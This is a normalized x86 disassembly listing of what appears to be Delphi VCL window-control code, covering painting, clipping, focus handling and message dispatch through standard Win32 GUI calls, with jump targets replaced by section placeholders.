test esi esi
je r-xdata
mov eax ebx
call sub_4507b8
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_450ee0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_45077c
call sub_44c7e0
inc edi
dec esi
jne r-xdata
sub_450fc4
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_450fe0
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_418470
call sub_450fe0
inc edi
dec esi
jne r-xdata
sub_451040
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_40338c
mov ebx eax
mov eax edi
call sub_450fe0
mov eax edi
call sub_45117c
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_451080
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push j_sub_403670#7
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_44e340
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_418470
call sub_451080
inc esi
dec ebx
jne r-xdata
sub_45117c
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_451080
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_4511bc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_450fe0
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_45117c
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406b2c
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44e340
jmp r-xdata
sub_451244
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45129c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_45128b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451292
call sub_44bbb4
call sub_427814
retn
sub_4512bc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_416e0c
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406b14
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_44e340
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_451374
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_418470
call sub_4512bc
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_418470
call sub_4512bc
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_451408
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_453a88
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406b00
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_451374
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406b14
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_44e340
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_45149c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_44d8fc
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_44e40c
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_451408
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406b00
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_44ccd0
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_451374
test eax eax
je r-xdata
mov eax ebx
call sub_464518
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_44e40c
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_453d8c
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_453a88
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_453a88
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_44e340
sub_451600
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_44e5a0
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_44e340
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_423580
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_424204
call sub_423580
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_424240
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_44cd2c
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_451708
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_44a018
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_44e340
mov [ esi + 0xc ] eax
mov bl 0x1
sub_45173c
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_45185c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_451894
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451863
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_418470
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_451894
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_4184cc
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_418470
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_416e34
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_418470
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_423580
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_416e34
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_423580
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_416e34
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_44bac8
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_44e340
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_451ac4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_44bac8
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_453a88
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_453a88
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_44e340
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_44e340
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_44bac8
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_451ac4
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_418470
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_451c18
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45173c
jmp r-xdata
mov eax ebx
call sub_4507b8
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_451d6a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_453a88
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_44e340
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_451c18
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_453a88
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_451d78
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_451708
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_451d98
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_451708
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_451e0c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_451708
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_451e2c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_451708
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_451e4c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_451708
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_451e70
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_451708
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_451e94
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_451708
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_451eb8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_451708
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_451edc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_43c850
mov edi eax
mov eax edi
call sub_43c930
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_424240
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_453a88
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_43cac8
jmp r-xdata
sub_451f64
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_44ec74
test bl bl
je r-xdata
mov eax edi
call sub_453d98
mov eax edi
call sub_453990
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_453990
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_452024
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_44e8d0
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_452074
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_453d98
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_450348
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_40338c
sub_4520bc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
